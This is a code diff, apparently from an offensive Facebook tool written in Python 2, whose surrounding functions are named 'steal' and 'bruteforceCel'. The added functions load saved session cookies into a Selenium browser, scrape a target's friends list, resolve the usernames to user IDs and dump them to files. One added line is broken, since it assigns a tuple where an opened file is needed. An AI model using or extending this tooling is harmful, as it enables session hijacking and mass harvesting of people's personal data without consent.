@@ -3146,6 +3146,33 @@ def steal():
             sleep(10)
             print emails + ' not valid email or password'
 
+def getUserIDS(username):
+    usernamesFile = open(os.path.join('dumps',username,username+"UserNames.txt"),"r")
+    userIDSFile = open(os.path.join('dumps',username,username+"UserIDS.txt"),"a").close()
+    userIDS = []
+    usernames = []
+    percentage = 0.0
+    i = 0
+    while True:
+        linea = usernamesFile.readline()
+        if not linea:
+            break
+        usernames.append(linea.strip('\n'))
+    total = len(usernames)
+    for user in usernames:
+        flush()
+        percentage = (100.0 * i)/total
+        print '\rCompleted [%.2f%%]\r'%percentage,
+        userIDSFile = open(os.path.join('dumps',username,username+"UserIDS.txt"),"a")
+        userID = getUserID(user)
+        userIDS.append(userID)
+        try:
+            userIDSFile.write(userID+'\n')
+        except:
+            print 'unknown error'
+        userIDSFile.close()
+        i += 1
+
 def sendPrivateMessage(message,buddy):
     
     c_user = getC_user()
@@ -3244,7 +3271,29 @@ def sendBroadcast(online):
         logs('Error in the sendBroadcast module')
         print '\rError in the sendBroadcast module\r'
         raise
- 
+def getFriends(username):
+    mkdir(username,'dumps')
+    friends = []
+    next = username+'?v=friends'
+    driver = webdriver.Firefox()
+    driver.get("https://www.facebook.com/")
+    cookies = pickle.load(open("cookies.pkl", "rb"))
+    for cookie in cookies:
+        driver.add_cookie(cookie)
+    
+    open("cookies.pkl", "wb").close()
+    
+    while next != -1:
+        driver.get("https://m.facebook.com/"+next)
+        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
+        data = driver.page_source
+        list, next = MyParser.parseFriends(data)
+        friends += list
+    usernames = (os.path.join('dumps',username,username+"UserNames.txt"),"w")
+    for friend in friends:
+        usernames.write(friend+'\n')
+    usernames.close()
+    driver.close()
 def bruteforceCel(first,start,end):
     c_user = getC_user()
     try:
